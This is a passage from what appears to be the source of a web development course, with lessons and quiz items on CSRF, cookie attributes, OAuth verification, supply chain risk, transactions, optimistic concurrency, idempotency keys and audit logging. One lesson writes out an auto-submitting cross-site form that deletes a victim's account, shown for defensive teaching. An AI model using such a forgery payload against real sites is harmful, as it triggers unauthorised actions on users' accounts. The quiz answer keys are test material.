            'A very long URL can overflow the layout and hide other controls',
            'The href can point at a site that copies your published stylesheet',
            'The href can carry a javascript: URL that runs on click',
          ], 3, 'React escapes the value safely into the attribute but makes no judgement about the scheme, so allowlisting http and https is what stops javascript: executing inside your own origin.'),
        ]
      ),
      lesson('Cookies, CSRF, and Choosing a Session Strategy', 13, `
You read the last topic, moved the token out of \`localStorage\` into a cookie so injected script cannot read it, and slept better. Then a learner opened a forum post on another site containing this:

\`\`\`html
<form action="https://learn.example.com/api/account" method="POST">
  <input name="_method" value="DELETE">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

The browser did what browsers do. It attached the cookie, because the cookie belongs to \`learn.example.com\` and it does not care which page started the request. Closing the XSS hole opened a CSRF hole. Both are real, and the cookie is still the better answer, but only once it is configured.

### The attributes that decide everything

| Attribute | What it does | What happens without it |
|---|---|---|
| \`HttpOnly\` | Hides the cookie from JavaScript | One line of injected script reads the session |
| \`Secure\` | Sends it over HTTPS only | It travels in clear to any \`http://\` URL on the domain |
| \`SameSite=Lax\` | Withholds it from cross site subrequests | The form above succeeds |
| \`Max-Age\` | Sets an expiry the browser enforces | The session lives until the tab closes, or forever |
| \`Domain\` | Chooses who receives it | Setting \`.example.com\` shares it with every subdomain |

\`\`\`js
res.cookie('sid', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 1000 * 60 * 60 * 24 * 14,
  path: '/',
});
\`\`\`

### SameSite is a floor, not a ceiling

Two gaps catch people who think \`Lax\` finished the job.

Lax still sends the cookie on a top level navigation. A cross site \`<img>\` or \`fetch\` is blocked, but a link the learner clicks is not. So any endpoint that changes state on GET, say \`GET /api/enrolments/42/cancel\`, is one email away from being triggered. Never mutate on GET.

And "same site" is judged on the registrable domain, not the host. \`promo.example.com\` counts as same site with \`learn.example.com\`. A forgotten marketing subdomain with an old WordPress install is enough to bypass the whole attribute.

### Double submit, in about ten lines

\`\`\`js
// Issued alongside the session cookie at login, readable by JS on purpose
const csrf = crypto.randomBytes(32).toString('hex');
res.cookie('csrf', csrf, { secure: true, sameSite: 'lax' });

app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  if (req.get('X-CSRF-Token') !== req.cookies.csrf) {
    return res.status(403).json({ message: 'CSRF check failed' });
  }
  next();
});
\`\`\`

An attacker's page can force the browser to send your cookie. It cannot read the value, because of the same origin policy, and it cannot attach a custom header cross origin without a preflight your CORS config refuses. That asymmetry is the whole trick.

### Which session strategy to pick

| Strategy | XSS exposure | Revoking access | Cost per request |
|---|---|---|---|
| JWT in \`localStorage\` | Total, script reads it | Impossible until expiry | None |
| JWT in \`HttpOnly\` cookie | Script cannot read it | Impossible until expiry | None |
| Opaque id in cookie | Script cannot read it | Immediate, delete the row | One cache lookup |

Revocation is the deciding column. Chapter 5 signed tokens with \`expiresIn: '7d'\`. Suspend an account at 09:00 and that token keeps working until next Tuesday, because no request consults the database. Two ways out: cut access tokens to five or fifteen minutes and rotate a refresh token held server side, or store an opaque session id and let the server own the truth.

Default to the opaque id in a \`Secure\`, \`HttpOnly\`, \`SameSite=Lax\` cookie, backed by Redis or a \`sessions\` table. Reach for the JWT when several services on different domains must verify a caller without calling you first, and accept that you now owe them a revocation list.
      `,
        [
          q('Your session cookie is HttpOnly, Secure and SameSite=Lax. Which request still arrives with the cookie attached?', [
            'A cross site fetch from evil.example sent with credentials included',
            'A top level navigation from an emailed link to a GET endpoint',
            'A cross site img tag pointing at your account delete endpoint',
            'A form POST submitted automatically by a page on evil.example',
          ], 1, 'Lax deliberately allows top level GET navigations so ordinary links keep working, which is why any endpoint that changes state on GET is still reachable from a link.'),
          q('Why does SameSite alone not protect learn.example.com from a compromised promo.example.com?', [
            'Subdomains each keep a separate cookie jar, so the session is copied',
            'SameSite only applies to cookies that also carry the Secure attribute',
            'Requests between subdomains bypass the browser cookie logic entirely',
            'Same site is judged on the registrable domain, so a subdomain counts',
          ], 3, 'SameSite compares the registrable domain rather than the full host, so anything under example.com is treated as same site and its requests carry the cookie normally.'),
          q('A double submit check compares a request header against a cookie. Why can an attacker\'s page not pass it?', [
            'It cannot read your cookie, nor set that header cross origin',
            'The cookie is HttpOnly, so the browser will not send it at all',
            'The token is signed, so any forged value fails verification',
            'Browsers block every cross origin POST to another registrable domain',
          ], 0, 'The browser attaches the cookie for the attacker, but the same origin policy stops their script reading its value, and a custom header forces a preflight your CORS config refuses.'),
        ]
      ),
      lesson('OAuth and Single Sign-On Without Rolling Your Own', 13, `
A team shipped "Sign in with Google" in an afternoon. The callback decoded the ID token, read the \`email\` claim, looked the learner up, and issued a session. It worked on the first try. It also accepted any Google ID token minted for any other application on the internet, so anyone with a token for an unrelated hobby project could sign in to the platform as anybody they liked.

Decoding is not verifying. The missing check was one claim, \`aud\`, and it is the most common serious bug in hand rolled single sign-on.

### OAuth authorises, OIDC authenticates

OAuth 2.0 answers one question: may this application call that API on the user's behalf. The access token you receive is a key to an API, not a statement about who is at the keyboard. OpenID Connect layers on top and adds the **ID token**, a signed JWT describing the user. A login reads the ID token. Treating "an access token arrived" as "this person is genuine" is the conceptual error underneath most broken integrations.

| OAuth term | What it is on this platform |
|---|---|
| Resource owner | The learner signing in |
| Client | \`learn.example.com\` |
| Authorization server | Google, Okta, Entra ID |
| Redirect URI | \`https://learn.example.com/auth/callback\` |
| Scope | \`openid email profile\` |

### The authorization code flow, in order

1. Redirect to the provider with \`client_id\`, \`redirect_uri\`, \`scope\`, \`state\`, \`nonce\` and a PKCE \`code_challenge\`.
2. The learner authenticates there and returns to your callback with \`code\` and \`state\`.
3. Your **server** swaps the code, the PKCE verifier and the client secret for tokens.
4. You verify the ID token, then mint your own session cookie from the previous topic.

\`\`\`js
const { id_token } = await exchangeCode(req.query.code, req.session.verifier);

const claims = await verifyIdToken(id_token, {
  issuer: 'https://accounts.google.com',
  audience: process.env.GOOGLE_CLIENT_ID,   // the check the team above skipped
  nonce: req.session.nonce,
});

if (!claims.email_verified) throw new Error('email not verified by provider');
\`\`\`

A library such as \`openid-client\` or \`jose\` fetches the provider's JWKS, checks the signature, and enforces \`iss\`, \`aud\` and \`exp\` for you. Write none of that yourself.

Step 3 says server for a reason. The old implicit flow returned tokens in the URL fragment, where they landed in browser history, in extensions, and in referrer headers. It is deprecated, and any tutorial still teaching it is old.

\`state\` and \`nonce\` do different jobs and both are required. \`state\` ties the callback to the browser that started the flow, which stops an attacker delivering their own authorization code and quietly logging the victim into the attacker's account. \`nonce\` is echoed inside the ID token and stops a captured token being replayed later.

### Account linking is where takeover happens

Two providers, one email address. If you link a new identity to an existing account on the email claim alone, then anyone who can obtain a token carrying \`alex@company.com\` from a provider that never verified it owns that account.

Link only when \`email_verified\` is true and the issuer is one you actually trust. Otherwise, make the already signed-in user confirm the link from inside their settings page. Store the provider \`sub\` as the stable key, because email addresses change and \`sub\` does not.

Register redirect URIs as exact strings. No wildcards, no reflecting a \`next\` parameter into the redirect, because an open redirect on that URI is how authorization codes get stolen.

### What you hand over

You stop owning password storage, password reset and credential stuffing, which is a large gift. In exchange, when the identity provider is down, nobody signs in. Keep one break glass administrator account with a local password and a hardware key, and test it before you need it.
      `,
        [
          q('An SSO callback decodes the ID token and trusts the email claim without checking aud. What does that allow?', [
            'Any signed in user to read another learner\'s profile through the API',
            'The provider to rotate its signing keys without warning your server',
            'An expired token to keep working long past its stated lifetime',
            'A token issued for a different application to log in as that user',
          ], 3, 'The aud claim names the application a token was minted for, so skipping it means any valid token from the same provider, including one from an unrelated app, is accepted as a login.'),
          q('What does the state parameter in an authorization code flow actually protect against?', [
            'An ID token being replayed after it has already been consumed once',
            'The authorization code being recovered from the browser\'s history',
            'A forged callback that signs the victim into the attacker\'s account',
            'A leaked client secret being used to mint access tokens directly',
          ], 2, 'state ties the callback to the browser session that began the flow, which is what stops an attacker delivering their own code to your callback and hijacking the sign in.'),
          q('Why is auto linking a new SSO identity to an existing account by email address risky?', [
            'Email addresses change far more often than subject identifiers do',
            'A provider that never verifies email lets anyone claim that address',
            'Two providers can return the same subject identifier for one person',
            'The email claim is encrypted and so cannot be compared reliably',
          ], 1, 'The email inside a token is only as trustworthy as the issuer that put it there, so linking without checking email_verified hands the account to whoever can obtain such a token.'),
        ]
      ),
      lesson('Dependencies, Secrets, and the Supply Chain', 13, `
Run this inside the React client:

\`\`\`bash
npm ls --all | wc -l
\`\`\`

Twelve or so lines in your \`package.json\`, and roughly 1,300 packages on disk. Every one of them may run a \`postinstall\` script during the install, on your laptop and in CI, with whatever happens to be in the environment at that moment.

That is not theoretical. In 2018 the maintainer of \`event-stream\` handed the package to a stranger who added a dependency that drained cryptocurrency wallets. In 2021 \`ua-parser-js\`, pulled in transitively by an enormous slice of the ecosystem, shipped a credential stealer for a few hours after an account takeover. Neither incident required a single bug in the code you wrote.

### The lockfile is the security boundary

\`npm ci\` from Chapter 7 installs precisely what \`package-lock.json\` pins, and the lockfile stores an integrity hash for every tarball, so a swapped package fails the install instead of running. Two additions earn their place in CI:

\`\`\`bash
npm ci --ignore-scripts
npm audit --omit=dev --audit-level=high
\`\`\`

\`--ignore-scripts\` is the one teams skip. It removes the shortest path from a compromised package to your build credentials. It also breaks anything that compiles native code, so if \`sharp\` or \`better-sqlite3\` needs a build step, allow that single package explicitly rather than dropping the flag for the whole tree.

### Three ways a package you never chose gets in

| Attack | How it works | The control |
|---|---|---|
| Typosquatting | \`crossenv\` installs instead of \`cross-env\` | Read the name of every new direct dependency |
| Dependency confusion | An internal name is published publicly and wins resolution | Pin the scope to your registry |
| Maintainer takeover | A real package, a new owner, a poisoned version | Pin versions, wait before adopting new releases |

Dependency confusion is worth a second look because it needs no mistake from you. If \`@cortexis/ui\` lives only on your internal registry, anyone can publish that exact name to the public one, and an install that does not know where the scope belongs may resolve theirs. One file closes it:

\`\`\`ini
# .npmrc
@cortexis:registry=https://npm.internal.cortexis.dev/
//npm.internal.cortexis.dev/:_authToken=\${NPM_TOKEN}
\`\`\`

### A secret that reached git history is a leaked secret

The instinct is to run \`git rm .env\`, commit, add the file to \`.gitignore\` and exhale. The value is still in every clone, every fork, every CI cache, and on the hosting provider's event API even after a force push.

Removal is housekeeping. **Rotation is the fix.** Treat anything ever committed as public, issue a new credential, and revoke the old one today.

\`\`\`bash
gitleaks detect --no-git --redact   # as a pre-commit hook
gitleaks detect --redact            # across the whole history, once
\`\`\`

### Nothing secret survives the client bundle

Chapter 5 read \`REACT_APP_API_BASE_URL\`, which is fine, because a base URL is already public. The rule people miss is that **every** variable with that prefix, or \`VITE_\` in a Vite app, is substituted into JavaScript that every visitor downloads.

\`\`\`js
// Broken: visible in devtools about four seconds after you deploy
const stripe = new Stripe(process.env.REACT_APP_STRIPE_SECRET_KEY);
\`\`\`

The publishable key belongs in the browser. The secret key stays on your server, which creates the charge and returns an id. If a value grants authority, it never crosses the network boundary toward the client.

### Keep the drift small

Turn on Dependabot or Renovate, batch patch and minor updates weekly, and auto merge when CI is green. Skip it for a year and a five minute bump becomes a migration project, which is precisely the state you will be in on the day a critical advisory lands and the patch is four majors away. Staleness is not a neutral choice, it is a slow loss of your ability to respond.
      `,
        [
          q('A team deletes a committed .env, adds it to .gitignore and force pushes. What is still required?', [
            'Rotating every credential that the file ever contained',
            'Re-running npm ci so the lockfile reflects the change',
            'Adding a pre-commit hook that blocks future commits',
            'Asking every developer to delete their local clone',
          ], 0, 'The value survives in existing clones, forks and CI caches, so the only reliable remedy is issuing new credentials and treating the old ones as public from now on.'),
          q('Why does running npm ci with --ignore-scripts reduce supply chain risk during a build?', [
            'It refuses to install any package published in the last seven days',
            'No package can run a postinstall command in your CI environment',
            'It verifies each tarball against the registry signing key first',
            'It installs only direct dependencies and skips the transitive tree',
          ], 1, 'Install scripts execute arbitrary code with access to the build environment and its credentials, so disabling them removes the shortest path from a bad package to your secrets.'),
          q('The package @cortexis/ui was never published publicly. How does dependency confusion exploit that?', [
            'A public package can declare @cortexis/ui as its own dependency',
            'The lockfile stores no integrity hash for an unpublished package',
            'Someone publishes that exact name publicly and the install takes it',
            'npm audit cannot report advisories for a private scope at all',
          ], 2, 'Without the scope pinned to your registry the client may resolve the name from the public one, so publishing that name is enough to get attacker code installed in your build.'),
        ]
      ),
      ],
      [
      q('Script is injected into a page on learn.example.com. Which measure limits the damage rather than preventing the injection?', [
        'Sanitising comment HTML against a tag allowlist before render',
        'Validating the URL scheme on every link a learner supplies',
        'Escaping values before they are interpolated into an attribute',
        'A Content Security Policy with a nonce and no unsafe-inline',
      ], 3, 'Sanitising and escaping stop a payload getting into the page at all, while CSP assumes something got through and refuses to execute it, which is why both layers are worth having.'),
      q('An account is deactivated at 09:00 but its owner keeps calling the API until 15:00. Which session design explains that?', [
        'A seven day JWT that no request checks against the database',
        'An opaque session id looked up in Redis on every single request',
        'A five minute access token paired with a rotating refresh token',
        'A session cookie marked HttpOnly, Secure and SameSite=Lax',
      ], 0, 'A self contained token is trusted on its signature alone, so nothing consults the record you changed and the old token stays valid right up to its expiry.'),
      q('Which of these stays exploitable on an app that already has a strict CSP, HttpOnly cookies and CSRF tokens?', [
        'A comment field that stores an onerror attribute in the database',
        'A cross site form POST aimed at the account delete endpoint',
        'An SSO callback that reads the email claim without verifying aud',
        'A script tag loaded from a CDN host the policy does not list',
      ], 2, 'Those three controls all operate in the browser and none of them inspects an ID token, so a login that trusts an unverified claim is completely untouched by any of them.'),
      q('Which of these values is safe to ship inside the React bundle that every visitor downloads?', [
        'The JWT signing secret the API uses to verify its own tokens',
        'The publishable payment key that identifies your account',
        'The database connection string pointing at the read replica',
        'The client secret used during the authorization code exchange',
      ], 1, 'A publishable key is designed to be public and can only create objects your server must then confirm, whereas the other three grant real authority and belong on the server.'),
      ]
    ),
    chapter(
      'Correctness When Requests Collide',
      'Keeping data true when two users, two tabs, and two retries all arrive at the same instant.',
      [
      lesson('Transactions and What Atomic Really Means', 13, `
Support opened a ticket that read "refunded, still enrolled". The refund handler ran two statements, add a credit back to the wallet and delete the enrolment row, and a deploy restarted the process between them. Fourteen learners kept a course they had been paid back for.

### Two statements are two chances to fail

Anything that has to be true together has to be written together:

\`\`\`js
// Broken: nothing ties these two to each other
await db.query('UPDATE wallets SET credits = credits + 1 WHERE userId = $1', [userId]);
await db.query('DELETE FROM enrolments WHERE userId = $1 AND courseId = $2', [userId, courseId]);
\`\`\`

A crash, a dropped connection, or a constraint violation on the second line leaves the first one applied and no way to tell. A transaction makes both one unit that either lands completely or not at all.

\`\`\`js
const client = await pool.connect();
try {
  await client.query('BEGIN');
  await client.query('UPDATE wallets SET credits = credits + 1 WHERE userId = $1', [userId]);
  await client.query('DELETE FROM enrolments WHERE userId = $1 AND courseId = $2', [userId, courseId]);
  await client.query('COMMIT');
} catch (err) {
  await client.query('ROLLBACK');
  throw err;
} finally {
  client.release();
}
\`\`\`

### The mistake that makes a transaction do nothing

Notice \`pool.connect()\`. This is where most people get it wrong:

\`\`\`js
await pool.query('BEGIN');       // goes out on connection 3
await pool.query('UPDATE ...');  // goes out on connection 7, commits on its own
await pool.query('COMMIT');      // commits an empty transaction on connection 3
\`\`\`

A pool hands out whichever connection is free. \`BEGIN\` binds to exactly one connection, so a transaction sprayed across a pool is not a transaction. It fails silently: every statement succeeds, nothing is grouped, and you only find out on the day something in the middle throws. Take a client, run every statement on that client, release it in \`finally\`.

\`better-sqlite3\` gives you the same guarantee through a wrapper, and because it is synchronous nothing can interleave:

\`\`\`js
const refund = db.transaction((userId, courseId) => {
  db.prepare('UPDATE wallets SET credits = credits + 1 WHERE userId = ?').run(userId);
  db.prepare('DELETE FROM enrolments WHERE userId = ? AND courseId = ?').run(userId, courseId);
});
refund(7, 42);
\`\`\`

### Atomic is one letter of four

| Letter | What it promises |
|---|---|
| Atomicity | Every statement lands, or none of them do |
| Consistency | The constraints from Chapter 5 still hold at commit |
| Isolation | Concurrent transactions do not see each other's half-done work |
| Durability | Once COMMIT returns, a power cut cannot undo it |

Isolation is the one that surprises people. PostgreSQL defaults to \`READ COMMITTED\`, which means each statement sees whatever was committed at the moment it started. Read the same row twice inside one transaction and the second read can come back different. Topic 2 is entirely about what that does to a read, modify, write.

### What a transaction cannot roll back

\`ROLLBACK\` undoes rows. It does not unsend an email, unfire a webhook, or un-charge a card:

\`\`\`js
await client.query('BEGIN');
await client.query('INSERT INTO certificates (userId, courseId) VALUES ($1, $2)', [userId, courseId]);
await sendCertificateEmail(user.email);   // wrong side of the commit
await client.query('COMMIT');             // if this throws, the email is already gone
\`\`\`

Do external work after \`COMMIT\` returns, or hand it to the queue from Chapter 7. That habit also keeps transactions short, and short matters more than it sounds: an open transaction holds locks, so a handler that keeps one open while awaiting a payment API stalls every other writer on those rows for the length of that call. A 900ms third-party timeout becomes 900ms of blocked writes for everyone.
      `,
        [
          q('A handler runs pool.query(\'BEGIN\'), then pool.query(\'UPDATE ...\'), then pool.query(\'COMMIT\') against a connection pool. What actually happens?', [
            'The pool sees the BEGIN and pins every later query to it',
            'The UPDATE fails because no transaction is open on it',
            'The UPDATE may run on another connection and commit alone',
            'The driver throws because BEGIN is illegal on a pool',
          ], 2, 'A pool hands out whichever connection is free, so BEGIN binds to one connection while the UPDATE can land on another and commit immediately, which leaves the transaction silently empty.'),
          q('Why should the certificate email be sent after COMMIT returns rather than between the INSERT and the COMMIT?', [
            'ROLLBACK cannot unsend the mail if the commit then fails',
            'Mail libraries cannot run inside a database client callback',
            'Sending mid transaction forces a stricter isolation level',
            'The new row is invisible to the mail service until COMMIT',
          ], 0, 'A transaction can only undo rows, so an email sent before the commit is already gone if the commit fails and the certificate row disappears.'),
          q('Inside one transaction you read the seatsLeft column twice, with no write of your own in between, and get 4 then 3. Which explanation is right?', [
            'The read is broken and needs a retry loop',
            'Atomicity was violated by the second read',
            'Durability does not apply until COMMIT returns',
            'READ COMMITTED lets other commits appear mid transaction',
          ], 3, 'Under READ COMMITTED each statement sees whatever was committed at the moment it started, so a repeated read can legitimately return a different value.'),
        ]
      ),
      lesson('Lost Updates and Optimistic Concurrency', 13, `
Two instructors opened the same course description at 09:14. One rewrote the opening paragraph, the other fixed a typo in the last line. Both clicked Save. The typo fix won, the rewritten paragraph was gone, and nothing anywhere reported an error. That is a lost update, and it is the quietest bug of the four covered here.

### The interleaving that eats your write

| Time | Request A | Request B |
|---|---|---|
| 09:14:02 | SELECT description | |
| 09:14:05 | | SELECT description |
| 09:16:30 | UPDATE with A's text | |
| 09:17:10 | | UPDATE with B's text |

Both requests read the same starting value. Neither did anything illegal. B just wrote last, over work it never saw. Wrapping each in a transaction does not help: under \`READ COMMITTED\` this exact sequence runs and both commit happily.

### For counters, never read then write

\`\`\`js
// Broken: two redemptions land at once, both read 3, both write 2
const { credits } = await db.get('SELECT credits FROM wallets WHERE userId = ?', userId);
await db.run('UPDATE wallets SET credits = ? WHERE userId = ?', credits - 1, userId);

// Correct: the database does the arithmetic while it holds the row lock
const r = await db.run('UPDATE wallets SET credits = credits - 1 WHERE userId = ? AND credits > 0', userId);
if (r.changes === 0) return res.status(409).json({ error: 'Not enough credits' });
\`\`\`

The second version is atomic, and the \`AND credits > 0\` guard means an empty wallet updates zero rows instead of going negative. That zero is your business rule firing, so read it.

### For documents, carry a version

A counter can be expressed as arithmetic. A description cannot, so make the client prove which version it was editing.

\`\`\`sql
ALTER TABLE courses ADD COLUMN version INTEGER NOT NULL DEFAULT 1;
\`\`\`

\`\`\`js
const result = await db.run(
  'UPDATE courses SET description = ?, version = version + 1 WHERE id = ? AND version = ?',
  [description, id, expectedVersion]
);

if (result.changes === 0) {
  return res.status(409).json({ error: 'This course changed since you opened it' });
}
\`\`\`

Skipping that \`result.changes\` check is the mistake, and it is easy to make because the update reports success either way. Zero rows changed means somebody committed first. \`409 Conflict\` is the status that says so (Chapter 4), and a good client answers it by reloading, showing both texts, and letting a human choose.

The same idea has a standard shape over HTTP: return the version as an \`ETag\`, require it back in \`If-Match\`, and answer a stale one with \`412 Precondition Failed\`. Browsers and caches already understand those headers.

### When to lock instead

Optimistic concurrency bets that conflicts are rare, and it is cheap when the bet pays. When it does not, buy a lock up front:

\`\`\`sql
BEGIN;
SELECT seatsLeft FROM cohorts WHERE id = 12 FOR UPDATE;   -- other writers now wait here
UPDATE cohorts SET seatsLeft = seatsLeft - 1 WHERE id = 12;
COMMIT;
\`\`\`

\`FOR UPDATE\` holds the row until commit. It suits the last seat in a cohort, where waiting 3ms beats retrying twenty times and losing nineteen. Two rules keep it safe. Lock rows in the same order everywhere, because two transactions grabbing the same two rows in opposite orders deadlock, and one of them gets killed. And never hold a lock across a network call, for the reason Topic 1 ended on.

Pick by conflict rate, not by taste. Rare collisions want a version column and a 409. Constant collisions on one hot row want a lock and a queue behind it.
      `,
        [
          q('Two requests both SELECT credits and read 3, then both UPDATE the column to 2. Wrapping each one in its own transaction under READ COMMITTED changes what?', [
            'Both updates are rejected with a serialization failure',
            'Nothing, both commit and one of the decrements is lost',
            'The second request reads 2 because the first holds a lock',
            'The wallet lands on 1 because the writes are queued up',
          ], 1, 'A transaction guarantees that a group of statements lands together, not that another transaction did not change the row you read, so the second write still overwrites the first.'),
          q('An UPDATE guarded by AND version = ? runs, and the handler returns 200 without checking the affected row count. What does the editor see?', [
            'A 409 telling them the record has moved on',
            'A driver error complaining that zero rows matched',
            'Their edit applied on top of the newer version',
            'A success message for an edit that was never saved',
          ], 3, 'An UPDATE that matches no rows is not an error, so an unchecked row count reports success while the guard has quietly rejected the write.'),
          q('Which situation argues for SELECT ... FOR UPDATE rather than a version column and a 409?', [
            'The last seat in a cohort, where many buyers hit one row',
            'A course description two instructors edit once a month',
            'A profile page one user updates from a single device',
            'A nightly report that reads many rows and writes none',
          ], 0, 'Optimistic concurrency is cheap only while conflicts are rare, so a single hot row with constant contention is better served by making writers wait for a lock.'),
        ]
      ),
      lesson('Idempotency Keys for Requests That Retry', 13, `
A learner on a train tapped Enrol. The request reached the API, created the enrolment, charged 40 credits, and then the tunnel ate the response. The app saw a timeout, did the helpful thing, and retried. She paid 80 credits for one course. Nothing crashed. Every component behaved exactly as written.

### Idempotent means repeatable, not harmless

| Request | Safe to repeat? | Why |
|---|---|---|
| \`GET /courses/react\` | Yes | It changes nothing |
| \`PUT /enrolments/9 {status:'active'}\` | Yes | It sets a value, not a delta |
| \`DELETE /enrolments/9\` | Yes | The second call finds nothing to do |
| \`POST /enrolments {courseId:42}\` | No | It creates another row every time |

Retries are not something you can opt out of. Fetch timeouts, service workers, load balancers, double-tapping users and background sync all replay a POST, so the endpoint itself has to recognise the replay.

### The cheapest fix is a natural key

Before building any machinery, ask whether the database already knows this is a duplicate:

\`\`\`sql
ALTER TABLE enrolments ADD CONSTRAINT enrolments_once UNIQUE (userId, courseId);
\`\`\`

\`\`\`js
const created = await db.get(
  \`INSERT INTO enrolments (userId, courseId) VALUES (?, ?)
   ON CONFLICT (userId, courseId) DO NOTHING
   RETURNING id\`,
  [userId, courseId]
);
if (!created) return res.status(200).json(await findEnrolment(userId, courseId));
\`\`\`

One enrolment per user per course is a rule you wanted anyway, and the constraint enforces it even when two retries arrive on two instances at once.

### When there is no natural key, the client supplies one

Top-ups and refunds are different: two identical requests can legitimately be two separate events. So the caller generates a UUID once, before the first attempt, and repeats it on every retry.

\`\`\`http
POST /credits/topup
Idempotency-Key: 6f1c8e2a-3b40-4d0f-9a11-77c5b2e1d8aa

{"amount": 40}
\`\`\`

\`\`\`sql
CREATE TABLE idempotency_keys (
  key         TEXT PRIMARY KEY,
  userId      INTEGER NOT NULL,
  fingerprint TEXT NOT NULL,          -- hash of method, path and body
  status      TEXT NOT NULL,          -- 'in_progress' or 'done'
  response    TEXT,
  createdAt   TIMESTAMPTZ NOT NULL DEFAULT now()
);
\`\`\`

Insert the key first and let the constraint arbitrate:

\`\`\`js
try {
  await client.query(
    \`INSERT INTO idempotency_keys (key, userId, fingerprint, status)
     VALUES ($1, $2, $3, 'in_progress')\`,
    [key, userId, fingerprint]
  );
} catch (err) {
  if (err.code !== '23505') throw err;              // 23505 is unique_violation
  const prior = await loadKey(key, userId);
  if (prior.fingerprint !== fingerprint) return res.status(422).json({ error: 'Key reused with a different body' });
  if (prior.status === 'in_progress') return res.status(409).json({ error: 'Original request still running' });
  return res.status(200).json(JSON.parse(prior.response));
}
\`\`\`

A \`SELECT\` to see whether the key exists, followed by an \`INSERT\`, is the same race as Chapter 5's duplicate email check. Two retries 4ms apart both find nothing, both insert, both charge. Write first, catch the violation.

Then commit the key row and the credit ledger row in one transaction (Topic 1). Split them and a crash in between gives you one of two bad days: a charge with no key, so the retry charges again, or a key for a charge that never happened, so the money never moves and the client is told it did.

### The details that decide whether it holds

- **Fingerprint the body.** The same key with \`amount: 250\` must fail loudly rather than return the receipt for 40.
- **Scope the key to the user.** A key is a \`PRIMARY KEY\` on a shared table, so check \`userId\` on lookup or one caller can read another's response.
- **Expire the rows.** Twenty four hours is the usual window. Delete older rows on a schedule, or the table outgrows the ledger it protects.
- **Generate the key before the first attempt.** A key regenerated per attempt is just a second request wearing a disguise, which is the single most common way this whole mechanism gets built and still fails.
      `,
        [
          q('Why is a repeated POST /enrolments dangerous when a repeated DELETE /enrolments/9 is not?', [
            'Proxies cache DELETE, so it never reaches the server twice',
            'POST bodies are larger, so they time out far more often',
            'POST creates a row each time, DELETE has nothing left to do',
            'DELETE is wrapped in a transaction by the driver already',
          ], 2, 'A repeated DELETE leaves the same end state because the row is already gone, while each POST creates a fresh row and so changes the outcome every time.'),
          q('A handler SELECTs the idempotency key, and inserts it when the SELECT finds nothing. Two retries arrive four milliseconds apart. What is the result?', [
            'The second retry waits until the first finishes inserting',
            'Both find no key, both insert, and the user is charged twice',
            'The second retry gets a 409 because the key already exists',
            'The primary key rejects both inserts, so neither charge lands',
          ], 1, 'Check then insert is a race, because both requests can pass the check before either one writes, which is why the insert must go first and the unique violation must be caught.'),
          q('The same Idempotency-Key arrives first with amount 40 and later with amount 250. What should the second response be?', [
            '200 with the stored receipt for the 40 credit top up',
            '201 after charging the newer amount of 250 credits',
            '200 after replacing the stored response with the new one',
            '422, because the key was reused with a different body',
          ], 3, 'Comparing the request fingerprint catches a key reused for different work, and failing loudly is safer than silently returning a receipt for an amount the caller did not send.'),
        ]
      ),
      lesson('Audit Trails, Retention, and the Right to Erasure', 13, `
A learner emailed to say her Advanced React enrolment had been cancelled and she never asked for it. The row was gone. \`updatedAt\` said Tuesday, 14:02. Nobody could say who did it, from where, or why. The support thread ran nine days and ended in a goodwill refund, because the system had recorded the state and never the story.

### Record events, not just rows

A table holds the current value. An audit log holds every transition into it.

\`\`\`sql
CREATE TABLE audit_events (
  id        BIGSERIAL PRIMARY KEY,
  actorId   INTEGER,                  -- null when a background job did it
  actorType TEXT NOT NULL,            -- 'user', 'admin', 'system'
  action    TEXT NOT NULL,            -- 'enrolment.cancelled'
  subject   TEXT NOT NULL,            -- 'enrolment:9182'
  before    JSONB,
  after     JSONB,
  requestId TEXT,
  ip        INET,
  createdAt TIMESTAMPTZ NOT NULL DEFAULT now()
);
\`\`\`

\`requestId\` is what turns this from an archive into a tool. Generate one at the edge, attach it to every log line and every audit row, and a nine day support thread becomes one query.

Append only. No UPDATE, no DELETE, enforced by the database rather than by good intentions:

\`\`\`sql
REVOKE UPDATE, DELETE ON audit_events FROM app_user;
\`\`\`

### Write it inside the transaction

\`\`\`js
await client.query('BEGIN');
await client.query('DELETE FROM enrolments WHERE id = $1', [id]);
await client.query(
  \`INSERT INTO audit_events (actorId, actorType, action, subject, before, requestId)
   VALUES ($1, 'admin', 'enrolment.cancelled', $2, $3, $4)\`,
  [req.user.id, \`enrolment:\${id}\`, JSON.stringify(prior), req.id]
);
await client.query('COMMIT');
\`\`\`

Log after the commit instead and a crash in the gap produces exactly the change nobody can explain, which is the situation the log exists to prevent.

Do not copy whole rows blindly into \`before\` and \`after\`. Password hashes, session tokens and API keys ride along if you do, and now the table you protect least holds the values you protect most. List the columns.

### Retention is a decision, not an accident

Audit tables grow faster than the tables they watch. One enrolment generates thirty rows over its life.

| Data | Keep for | Why |
|---|---|---|
| Financial events | 7 years | Tax and accounting rules |
| Logins and role changes | 12 months | Investigating a breach found months later |
| Request logs holding IPs | 30 days | Debugging, and an IP is personal data |
| Draft lesson autosaves | 7 days | Nobody wants the 400th version |

Partition by month and drop whole partitions. A \`DELETE\` of 200 million rows writes as much as inserting them did, and blocks while it works.

### Erasure without destroying the record

A person can require that their personal data be erased. An immutable audit log looks like a contradiction. It is not, because what has to go is the personal data, not the fact that an event happened.

Keep identity in one table, reference it by id everywhere else, and erase in that one place:

\`\`\`sql
UPDATE users
   SET email = 'erased+' || id || '@invalid',
       name = 'Erased user',
       erasedAt = now()
 WHERE id = 4471;
\`\`\`

Every audit row still reads that actor 4471 cancelled enrolment 9182 at 14:02, so the trail survives while the person is no longer identifiable from it. This only works if you were disciplined earlier: an email copied into ninety thousand \`after\` blobs turns one UPDATE into a search across a hundred million JSON documents.

Soft deletes need one more piece. A row with \`deletedAt\` set still occupies the unique index, so a returning learner cannot sign up again with their old address:

\`\`\`sql
DROP INDEX users_email_key;
CREATE UNIQUE INDEX users_email_live ON users (email) WHERE deletedAt IS NULL;
\`\`\`

A partial index applies the constraint only to live rows, which is what you meant the first time.
      `,
        [
          q('Why write the audit row in the same transaction as the change it describes?', [
            'A crash between them leaves a change with no record of who did it',
            'The audit table needs the same isolation level as the source',
            'Two transactions would deadlock on the audit primary key',
            'JSONB columns can only be written inside an open transaction',
          ], 0, 'Committing them together means the log can never disagree with the data, because a failure rolls back the change and its audit row as one unit.'),
          q('An erasure request arrives for user 4471, who appears in 90,000 audit rows. What satisfies the request and keeps the log usable?', [
